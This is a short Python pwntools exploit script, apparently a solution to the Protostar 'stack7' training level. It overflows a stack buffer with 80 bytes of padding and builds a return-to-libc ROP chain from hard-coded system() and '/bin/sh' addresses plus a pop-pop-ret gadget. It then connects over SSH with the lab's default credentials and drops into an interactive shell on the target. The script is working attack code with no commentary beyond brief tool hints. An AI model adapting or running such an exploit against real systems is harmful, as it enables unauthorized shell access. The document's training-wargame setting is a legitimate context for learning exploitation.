#!/usr/bin/env python
from pwn import *


elf = ELF('./stack7')

libcBase = 0xb7e97000 # (gdb) info proc map ## process must be running
system = 0xb7ecffb0  # (gdb) p system ## process must be running
shellOffset = 0x11f3bf # strings -a -t x /lib/libc-2.11.2.so | grep "/bin/sh"
binsh = libcBase + shellOffset   # These are the addresses in rop

elf.symbols = {'system': system, 'binsh': binsh}

offset = 80
rop = ROP(elf)
                        # gadget = 0x08048492     
                        # pop pop ret gadget, can be done by:
                        # msfelfscan -p <binary> ,or objdump -d
                        # or ROPgadget --binary stack7 | grep pop
                        # you can find it also like this below

gadget = rop.find_gadget([u'pop ebx', u'pop ebp'])[0]
rop.raw(gadget)
rop.raw(0x2BadCafe)
rop.raw(0xBabeFace)
rop.call(elf.symbols['system'], [elf.symbols['binsh']])




if len(sys.argv) < 2:
    print("usage: ./%s <ip>" % sys.argv[0])
else:
    s = ssh("user", sys.argv[1], 22, password="user")
    payload = 'A' * offset
    payload += rop.chain()
    r = s.run('/opt/protostar/bin/stack7')
    print(r.recv(1024))
    r.send(payload+ '\n')
    r.interactive()
    r.close()
